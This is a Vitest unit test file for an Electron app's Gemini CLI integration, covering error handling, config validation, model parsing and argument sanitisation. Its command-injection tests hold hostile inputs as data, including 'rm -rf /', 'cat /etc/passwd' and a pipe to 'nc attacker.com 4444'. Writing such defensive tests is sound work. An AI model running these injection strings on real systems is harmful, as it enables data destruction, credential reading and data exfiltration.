import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import { spawn } from 'child_process';
import { EventEmitter } from 'events';

// Mock child_process
vi.mock('child_process', () => ({
  spawn: vi.fn()
}));

// Mock electron
vi.mock('electron', () => ({
  app: {
    getPath: vi.fn(() => '/mock/user/data')
  }
}));

// Mock fs operations
vi.mock('node:fs', () => ({
  default: {
    existsSync: vi.fn(() => false),
    readFileSync: vi.fn(),
    writeFileSync: vi.fn(),
    mkdirSync: vi.fn()
  }
}));

// Mock path operations
vi.mock('node:path', () => ({
  default: {
    join: vi.fn((...args) => args.join('/')),
    dirname: vi.fn(() => '/mock/dir')
  }
}));

// Import the classes we want to test
import { ConfigHelper } from '../electron/ConfigHelper';
import { 
  CLIError, 
  CLI_ERROR_CODES,
  createCLIError,
  categorizeCLIError,
  isErrorRetryable,
  formatErrorForUser,
  getRetryDelay
} from '../electron/CLIErrorTypes';

describe('CLI Integration Unit Tests', () => {
  let configHelper: ConfigHelper;
  let mockProcess: any;
  let mockSpawn: any;

  beforeEach(() => {
    vi.clearAllMocks();
    configHelper = new ConfigHelper();
    
    // Create a mock process object
    mockProcess = new EventEmitter();
    mockProcess.stdout = new EventEmitter();
    mockProcess.stderr = new EventEmitter();
    mockProcess.kill = vi.fn();
    mockProcess.killed = false;
    
    // Mock spawn to return our mock process
    mockSpawn = vi.mocked(spawn);
    mockSpawn.mockReturnValue(mockProcess);
  });

  afterEach(() => {
    vi.clearAllTimers();
  });

  describe('CLI Command Construction and Execution', () => {
    it('should construct valid CLI commands for different operations', () => {
      // Test command construction for different operations
      const extractionCommand = {
        command: 'gemini',
        args: ['generate', '--model', 'gemini-2.0-flash', '--temperature', '0.2'],
        timeout: 30000
      };

      const solutionCommand = {
        command: 'gemini',
        args: ['generate', '--model', 'gemini-1.5-pro', '--temperature', '0.1'],
        timeout: 45000
      };

      const debugCommand = {
        command: 'gemini',
        args: ['generate', '--model', 'gemini-2.0-flash', '--temperature', '0.3'],
        timeout: 60000
      };

      // Verify command structure
      expect(extractionCommand.command).toBe('gemini');
      expect(extractionCommand.args).toContain('generate');
      expect(extractionCommand.args).toContain('--model');
      expect(extractionCommand.args).toContain('gemini-2.0-flash');
      expect(extractionCommand.timeout).toBe(30000);

      expect(solutionCommand.args).toContain('gemini-1.5-pro');
      expect(debugCommand.args).toContain('--temperature');
    });

    it('should sanitize CLI arguments to prevent command injection', () => {
      // Create a mock ProcessingHelper to test sanitization
      class MockProcessingHelper {
        sanitizeCliArguments(args: string[]): string[] {
          return args.map(arg => {
            return arg
              .replace(/[;&|`$(){}[\]<>]/g, '') // Remove shell metacharacters
              .replace(/\s+/g, ' ') // Normalize whitespace
              .trim();
          }).filter(arg => arg.length > 0);
        }
      }

      const helper = new MockProcessingHelper();
      
      const dangerousArgs = [
        'arg1; rm -rf /',
        'arg2 && malicious',
        'arg3 | cat /etc/passwd',
        'arg4 `whoami`',
        'arg5 $(id)',
        'arg6 {test}',
        'arg7 [test]',
        'arg8 <input',
        'arg9 >output'
      ];

      const sanitized = helper.sanitizeCliArguments(dangerousArgs);

      expect(sanitized).toEqual([
        'arg1 rm -rf /',
        'arg2 malicious',
        'arg3 cat /etc/passwd',
        'arg4 whoami',
        'arg5 id',
        'arg6 test',
        'arg7 test',
        'arg8 input',
        'arg9 output'
      ]);
    });

    it('should handle command execution with proper process management', async () => {
      // Mock a successful CLI execution
      const executePromise = configHelper.detectGeminiCLIInstallation();

      // Simulate successful version output
      setTimeout(() => {
        mockProcess.stdout.emit('data', 'gemini 1.2.3\n');
        mockProcess.emit('close', 0);
      }, 10);

      const result = await executePromise;

      expect(result.isInstalled).toBe(true);
      expect(result.version).toBe('1.2.3');
      expect(mockSpawn).toHaveBeenCalledWith('gemini', ['--version'], {
        stdio: 'pipe',
        shell: true
      });
    });

    it('should handle process timeout correctly', async () => {
      const executePromise = configHelper.detectGeminiCLIInstallation();

      // Don't emit any events, let it timeout
      const result = await executePromise;

      expect(result.isInstalled).toBe(false);
      expect(result.error).toBe('Gemini CLI command timed out');
      expect(mockProcess.kill).toHaveBeenCalled();
    }, 10000);

    it('should handle process errors gracefully', async () => {
      const executePromise = configHelper.detectGeminiCLIInstallation();

      setTimeout(() => {
        mockProcess.emit('error', new Error('ENOENT: no such file or directory'));
      }, 10);

      const result = await executePromise;

      expect(result.isInstalled).toBe(false);
      expect(result.error).toContain('Failed to execute Gemini CLI');
    });
  });

  describe('Error Handling and Edge Cases', () => {
    it('should categorize CLI errors correctly', () => {
      // Test different error categorizations
      const installationError = categorizeCLIError('command not found: gemini', 127);
      expect(installationError.code).toBe(CLI_ERROR_CODES.CLI_NOT_FOUND);
      expect(installationError.category).toBe('installation');

      const authError = categorizeCLIError('not authenticated', 1);
      expect(authError.code).toBe(CLI_ERROR_CODES.AUTH_NOT_AUTHENTICATED);
      expect(authError.category).toBe('authentication');

      const networkError = categorizeCLIError('network connection failed', 1);
      expect(networkError.code).toBe(CLI_ERROR_CODES.NETWORK_CONNECTION_FAILED);
      expect(networkError.category).toBe('network');

      const quotaError = categorizeCLIError('quota exceeded', 1);
      expect(quotaError.code).toBe(CLI_ERROR_CODES.QUOTA_EXCEEDED);
      expect(quotaError.category).toBe('quota');
    });

    it('should determine error retryability correctly', () => {
      const retryableError = createCLIError(CLI_ERROR_CODES.NETWORK_CONNECTION_FAILED);
      const nonRetryableError = createCLIError(CLI_ERROR_CODES.CLI_NOT_FOUND);

      expect(isErrorRetryable(retryableError)).toBe(true);
      expect(isErrorRetryable(nonRetryableError)).toBe(false);
    });

    it('should calculate appropriate retry delays', () => {
      const networkError = createCLIError(CLI_ERROR_CODES.NETWORK_CONNECTION_FAILED);
      const rateLimit = createCLIError(CLI_ERROR_CODES.RATE_LIMIT_EXCEEDED);

      const networkDelay1 = getRetryDelay(networkError, 1);
      const networkDelay2 = getRetryDelay(networkError, 2);
      const rateLimitDelay1 = getRetryDelay(rateLimit, 1);

      // Network errors should have base delay around 2000ms
      expect(networkDelay1).toBeGreaterThan(1500);
      expect(networkDelay1).toBeLessThan(3000);

      // Rate limit errors should have longer base delay (retryable quota error)
      expect(rateLimitDelay1).toBeGreaterThan(4000);

      // Exponential backoff should increase delay
      expect(networkDelay2).toBeGreaterThan(networkDelay1);

      // All delays should be capped at 30 seconds
      expect(networkDelay1).toBeLessThanOrEqual(30000);
      expect(networkDelay2).toBeLessThanOrEqual(30000);
      expect(rateLimitDelay1).toBeLessThanOrEqual(30000);
    });

    it('should format user-friendly error messages', () => {
      const cliError = createCLIError(CLI_ERROR_CODES.CLI_NOT_FOUND);
      const errorInfo = formatErrorForUser(cliError);

      expect(errorInfo.title).toContain('Installation Error');
      expect(errorInfo.message).toContain('not installed');
      expect(errorInfo.steps).toBeInstanceOf(Array);
      expect(errorInfo.steps.length).toBeGreaterThan(0);
      expect(errorInfo.helpUrl).toBeDefined();
    });

    it('should handle malformed CLI output', () => {
      // Test version parsing with various formats
      const configHelperInstance = configHelper as any;
      
      expect(configHelperInstance.parseGeminiCLIVersion('gemini 1.2.3')).toBe('1.2.3');
      expect(configHelperInstance.parseGeminiCLIVersion('version 1.2.3')).toBe('1.2.3');
      expect(configHelperInstance.parseGeminiCLIVersion('1.2.3')).toBe('1.2.3');
      expect(configHelperInstance.parseGeminiCLIVersion('invalid output')).toBe('unknown');
      expect(configHelperInstance.parseGeminiCLIVersion('')).toBe('unknown');
    });

    it('should validate version compatibility correctly', () => {
      const configHelperInstance = configHelper as any;
      
      // Compatible versions
      expect(configHelperInstance.isGeminiCLIVersionCompatible('1.0.0')).toBe(true);
      expect(configHelperInstance.isGeminiCLIVersionCompatible('1.5.2')).toBe(true);
      expect(configHelperInstance.isGeminiCLIVersionCompatible('2.0.0')).toBe(true);

      // Incompatible versions
      expect(configHelperInstance.isGeminiCLIVersionCompatible('0.9.9')).toBe(false);
      expect(configHelperInstance.isGeminiCLIVersionCompatible('unknown')).toBe(false);
      expect(configHelperInstance.isGeminiCLIVersionCompatible('invalid')).toBe(false);
    });

    it('should handle authentication status parsing', () => {
      const configHelperInstance = configHelper as any;
      
      const googleAuth = configHelperInstance.parseGeminiCLIAuthStatus('Authenticated with Google account');
      expect(googleAuth.isAuthenticated).toBe(true);
      expect(googleAuth.method).toBe('Google OAuth');

      const serviceAuth = configHelperInstance.parseGeminiCLIAuthStatus('Authenticated with service account');
      expect(serviceAuth.isAuthenticated).toBe(true);
      expect(serviceAuth.method).toBe('Service Account');

      const notAuth = configHelperInstance.parseGeminiCLIAuthStatus('Not authenticated');
      expect(notAuth.isAuthenticated).toBe(false);

      const unknown = configHelperInstance.parseGeminiCLIAuthStatus('Unknown status');
      expect(unknown.isAuthenticated).toBe(false);
    });
  });

  describe('Configuration Validation and Model Selection', () => {
    it('should validate CLI configuration parameters', () => {
      // Test timeout validation
      const validTimeout = configHelper.validateCLITimeout(30000);
      expect(validTimeout.valid).toBe(true);

      const invalidTimeoutLow = configHelper.validateCLITimeout(1000);
      expect(invalidTimeoutLow.valid).toBe(false);
      expect(invalidTimeoutLow.sanitized).toBe(5000);

      const invalidTimeoutHigh = configHelper.validateCLITimeout(700000);
      expect(invalidTimeoutHigh.valid).toBe(false);
      expect(invalidTimeoutHigh.sanitized).toBe(600000);

      // Test retry validation
      const validRetries = configHelper.validateCLIMaxRetries(3);
      expect(validRetries.valid).toBe(true);

      const invalidRetriesNegative = configHelper.validateCLIMaxRetries(-1);
      expect(invalidRetriesNegative.valid).toBe(false);
      expect(invalidRetriesNegative.sanitized).toBe(0);

      const invalidRetriesHigh = configHelper.validateCLIMaxRetries(15);
      expect(invalidRetriesHigh.valid).toBe(false);
      expect(invalidRetriesHigh.sanitized).toBe(10);
    });

    it('should validate complete CLI configuration', () => {
      const validConfig = {
        cliTimeout: 30000,
        cliMaxRetries: 3
      };

      const validation = configHelper.validateCLIConfig(validConfig);
      expect(validation.valid).toBe(true);
      expect(validation.errors).toHaveLength(0);

      const invalidConfig = {
        cliTimeout: 1000, // Too low
        cliMaxRetries: -1  // Negative
      };

      const invalidValidation = configHelper.validateCLIConfig(invalidConfig);
      expect(invalidValidation.valid).toBe(false);
      expect(invalidValidation.errors.length).toBeGreaterThan(0);
      expect(invalidValidation.sanitized.cliTimeout).toBe(5000);
      expect(invalidValidation.sanitized.cliMaxRetries).toBe(0);
    });

    it('should handle model selection for CLI provider', async () => {
      // Mock successful models retrieval
      const modelsPromise = configHelper.getGeminiCLIModels();

      setTimeout(() => {
        mockProcess.stdout.emit('data', 'gemini-1.5-pro\ngemini-2.0-flash\ngemini-1.0-pro\n');
        mockProcess.emit('close', 0);
      }, 10);

      const result = await modelsPromise;

      expect(result.models).toContain('gemini-1.5-pro');
      expect(result.models).toContain('gemini-2.0-flash');
      expect(result.models).not.toContain('gemini-1.0-pro'); // Should be filtered out as incompatible
      expect(result.error).toBeUndefined();
    });

    it('should parse different model list formats', () => {
      const configHelperInstance = configHelper as any;

      // Simple list format
      const simpleList = 'gemini-1.5-pro\ngemini-2.0-flash\n';
      const simpleModels = configHelperInstance.parseGeminiCLIModels(simpleList);
      expect(simpleModels).toEqual(['gemini-1.5-pro', 'gemini-2.0-flash']);

      // Table format
      const tableFormat = `
Model                Description
---                  ---
gemini-1.5-pro      Advanced model
gemini-2.0-flash    Fast model
`;
      const tableModels = configHelperInstance.parseGeminiCLIModels(tableFormat);
      expect(tableModels).toEqual(['gemini-1.5-pro', 'gemini-2.0-flash']);

      // JSON format
      const jsonFormat = `
{"name": "gemini-1.5-pro", "description": "Advanced"}
{"name": "gemini-2.0-flash", "description": "Fast"}
`;
      const jsonModels = configHelperInstance.parseGeminiCLIModels(jsonFormat);
      expect(jsonModels).toEqual(['gemini-1.5-pro', 'gemini-2.0-flash']);

      // Empty output
      const emptyModels = configHelperInstance.parseGeminiCLIModels('');
      expect(emptyModels).toEqual([]);
    });

    it('should filter compatible models correctly', () => {
      const configHelperInstance = configHelper as any;

      const allModels = [
        'gemini-1.5-pro',
        'gemini-2.0-flash', 
        'gemini-1.0-pro',    // Should be filtered out
        'gemini-0.5-beta',   // Should be filtered out
        'other-model'        // Should be filtered out
      ];

      const compatibleModels = configHelperInstance.filterCompatibleModels(allModels);
      expect(compatibleModels).toEqual(['gemini-1.5-pro', 'gemini-2.0-flash']);
    });

    it('should validate API key format for CLI provider', () => {
      // CLI provider should always return true since it doesn't use API keys
      expect(configHelper.isValidApiKeyFormat('', 'gemini-cli')).toBe(true);
      expect(configHelper.isValidApiKeyFormat('any-string', 'gemini-cli')).toBe(true);
      expect(configHelper.isValidApiKeyFormat('invalid-key', 'gemini-cli')).toBe(true);
    });
  });

  describe('Integration Testing Scenarios', () => {
    it('should handle complete CLI workflow from detection to execution', async () => {
      // Test the complete workflow: detection -> authentication -> model retrieval
      
      // 1. CLI Detection
      const detectionPromise = configHelper.detectGeminiCLIInstallation();
      setTimeout(() => {
        mockProcess.stdout.emit('data', 'gemini 1.2.3\n');
        mockProcess.emit('close', 0);
      }, 10);
      const detectionResult = await detectionPromise;
      expect(detectionResult.isInstalled).toBe(true);

      // 2. Authentication Check
      const authPromise = configHelper.validateGeminiCLIAuthentication();
      setTimeout(() => {
        mockProcess.stdout.emit('data', 'Authenticated with Google account\n');
        mockProcess.emit('close', 0);
      }, 10);
      const authResult = await authPromise;
      expect(authResult.isAuthenticated).toBe(true);

      // 3. Model Retrieval
      const modelsPromise = configHelper.getGeminiCLIModels();
      setTimeout(() => {
        mockProcess.stdout.emit('data', 'gemini-1.5-pro\ngemini-2.0-flash\n');
        mockProcess.emit('close', 0);
      }, 10);
      const modelsResult = await modelsPromise;
      expect(modelsResult.models.length).toBeGreaterThan(0);
    });

    it('should handle CLI provider switching in configuration', () => {
      // Test switching to CLI provider
      const initialConfig = configHelper.loadConfig();
      expect(initialConfig.apiProvider).toBe('gemini'); // Default

      const updatedConfig = configHelper.updateConfig({ 
        apiProvider: 'gemini-cli' 
      });
      expect(updatedConfig.apiProvider).toBe('gemini-cli');
      expect(updatedConfig.extractionModel).toBe('gemini-2.0-flash'); // Should reset to CLI default
    });

    it('should handle concurrent CLI operations', async () => {
      // Test multiple CLI operations running concurrently
      let callCount = 0;
      
      // Mock spawn to return different processes for each call
      mockSpawn.mockImplementation(() => {
        const process = new EventEmitter();
        process.stdout = new EventEmitter();
        process.stderr = new EventEmitter();
        process.kill = vi.fn();
        process.killed = false;
        
        // Simulate different responses for different calls
        setTimeout(() => {
          if (callCount === 0) {
            process.stdout.emit('data', 'gemini 1.2.3\n');
          } else if (callCount === 1) {
            process.stdout.emit('data', 'Authenticated with Google account\n');
          } else {
            process.stdout.emit('data', 'gemini-1.5-pro\ngemini-2.0-flash\n');
          }
          process.emit('close', 0);
          callCount++;
        }, 10);
        
        return process;
      });

      const operations = [
        configHelper.detectGeminiCLIInstallation(),
        configHelper.validateGeminiCLIAuthentication(),
        configHelper.getGeminiCLIModels()
      ];

      const results = await Promise.allSettled(operations);
      
      // At least one operation should succeed
      const successfulResults = results.filter(result => result.status === 'fulfilled');
      expect(successfulResults.length).toBeGreaterThan(0);
    }, 10000);

    it('should handle CLI status retrieval with comprehensive error information', async () => {
      // Mock CLI not installed scenario
      vi.spyOn(configHelper, 'detectGeminiCLIInstallation').mockResolvedValue({
        isInstalled: false,
        isCompatible: false,
        error: 'command not found: gemini'
      });

      const status = await configHelper.getGeminiCLIStatus();
      
      expect(status.isInstalled).toBe(false);
      expect(status.isAuthenticated).toBe(false);
      expect(status.error).toBeDefined();
      expect(status.errorCategory).toBe('installation');
      expect(status.actionableSteps).toBeInstanceOf(Array);
      expect(status.actionableSteps.length).toBeGreaterThan(0);
    });

    it('should handle error recovery and graceful degradation', () => {
      // Test error recovery mechanisms
      const cliError = createCLIError(CLI_ERROR_CODES.NETWORK_CONNECTION_FAILED, 'Connection timeout');
      
      // Should be retryable
      expect(isErrorRetryable(cliError)).toBe(true);
      
      // Should have appropriate retry delay
      const delay = getRetryDelay(cliError, 1);
      expect(delay).toBeGreaterThan(1000);
      expect(delay).toBeLessThanOrEqual(30000);
      
      // Should provide user-friendly error message
      const errorInfo = formatErrorForUser(cliError);
      expect(errorInfo.message).toContain('connect');
      expect(errorInfo.steps).toContain('Check your internet connection');
    });
  });

  describe('Performance and Resource Management', () => {
    it('should handle timeout scenarios correctly', async () => {
      // Test various timeout scenarios
      const shortTimeoutPromise = configHelper.detectGeminiCLIInstallation();
      
      // Don't provide any response, should timeout
      const result = await shortTimeoutPromise;
      
      expect(result.isInstalled).toBe(false);
      expect(result.error).toContain('timed out');
      expect(mockProcess.kill).toHaveBeenCalled();
    }, 10000);

    it('should clean up resources properly', async () => {
      const executePromise = configHelper.detectGeminiCLIInstallation();

      // Simulate process completion
      setTimeout(() => {
        mockProcess.stdout.emit('data', 'gemini 1.2.3\n');
        mockProcess.emit('close', 0);
      }, 10);

      await executePromise;

      // Verify cleanup was called (process should not be killed for successful completion)
      // The kill method should not be called for successful operations
      expect(mockProcess.kill).not.toHaveBeenCalled();
    });

    it('should handle memory management for large outputs', () => {
      // Test handling of large CLI outputs
      const configHelperInstance = configHelper as any;
      
      // Create a large model list
      const largeModelList = Array.from({ length: 100 }, (_, i) => `gemini-model-${i}`).join('\n');
      const models = configHelperInstance.parseGeminiCLIModels(largeModelList);
      
      // Should handle large inputs without issues
      expect(models).toBeInstanceOf(Array);
      expect(models.length).toBeLessThanOrEqual(100); // Some may be filtered out
    });
  });

  describe('Security and Input Validation', () => {
    it('should prevent command injection in CLI arguments', () => {
      class MockProcessingHelper {
        sanitizeCliArguments(args: string[]): string[] {
          return args.map(arg => {
            return arg
              .replace(/[;&|`$(){}[\]<>]/g, '')
              .replace(/\s+/g, ' ')
              .trim();
          }).filter(arg => arg.length > 0);
        }
      }

      const helper = new MockProcessingHelper();
      
      const maliciousArgs = [
        '--model; rm -rf /',
        '--temperature && cat /etc/passwd',
        '--input | nc attacker.com 4444',
        '--output `whoami`'
      ];

      const sanitized = helper.sanitizeCliArguments(maliciousArgs);
      
      // Should remove dangerous characters
      sanitized.forEach(arg => {
        expect(arg).not.toMatch(/[;&|`$(){}[\]<>]/);
      });
    });

    it('should validate input parameters before CLI execution', () => {
      // Test parameter validation
      const invalidTimeout = configHelper.validateCLITimeout(-1000);
      expect(invalidTimeout.valid).toBe(false);
      expect(invalidTimeout.sanitized).toBeGreaterThan(0);

      const invalidRetries = configHelper.validateCLIMaxRetries(100);
      expect(invalidRetries.valid).toBe(false);
      expect(invalidRetries.sanitized).toBeLessThanOrEqual(10);
    });

    it('should handle untrusted CLI output safely', () => {
      const configHelperInstance = configHelper as any;
      
      // Test with potentially malicious output
      const maliciousOutput = `
        gemini-1.5-pro
        ; rm -rf /
        gemini-2.0-flash
        && malicious-command
      `;
      
      const models = configHelperInstance.parseGeminiCLIModels(maliciousOutput);
      
      // Should only extract valid model names
      expect(models).toEqual(['gemini-1.5-pro', 'gemini-2.0-flash']);
      expect(models).not.toContain('; rm -rf /');
      expect(models).not.toContain('&& malicious-command');
    });
  });
});